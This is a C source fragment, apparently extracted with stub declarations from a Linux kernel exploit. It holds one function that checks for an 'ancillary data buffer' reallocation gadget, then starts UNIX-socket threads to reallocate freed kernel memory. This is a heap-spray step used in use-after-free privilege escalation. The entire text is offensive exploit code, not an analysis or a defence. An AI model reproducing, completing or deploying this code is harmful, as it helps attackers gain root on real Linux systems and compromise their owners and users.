
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct realloc_thread_arg {int tid; } ;


 int _sched_yield () ;
 int can_use_realloc_gadget () ;
 size_t g_nb_realloc_thread_ready ;
 scalar_t__ init_realloc_data () ;
 scalar_t__ init_unix_sockets (struct realloc_thread_arg*) ;
 int perror (char*) ;
 int printf (char*,...) ;
 int pthread_create (int *,int *,int ,struct realloc_thread_arg*) ;
 int realloc_thread ;

__attribute__((used)) static int init_reallocation(struct realloc_thread_arg *rta, size_t nb_reallocs)
{
  int thread = 0;
  int ret = -1;

  if (!can_use_realloc_gadget())
  {
    printf("[-] can't use the 'ancillary data buffer' reallocation gadget!\n");
    goto fail;
  }
  printf("[+] can use the 'ancillary data buffer' reallocation gadget!\n");

  if (init_realloc_data())
  {
    printf("[-] failed to initialize reallocation data!\n");
    goto fail;
  }
  printf("[+] reallocation data initialized!\n");

  printf("[ ] initializing reallocation threads, please wait...\n");
  for (thread = 0; thread < nb_reallocs; ++thread)
  {
    if (init_unix_sockets(&rta[thread]))
    {
      printf("[-] failed to init UNIX sockets!\n");
      goto fail;
    }

    if ((ret = pthread_create(&rta[thread].tid, ((void*)0), realloc_thread, &rta[thread])) != 0)
    {
      perror("[-] pthread_create");
      goto fail;
    }
  }


  while (g_nb_realloc_thread_ready < nb_reallocs)
    _sched_yield();

  printf("[+] %lu reallocation threads ready!\n", nb_reallocs);

  return 0;

fail:
  printf("[-] failed to initialize reallocation\n");
  return -1;
}
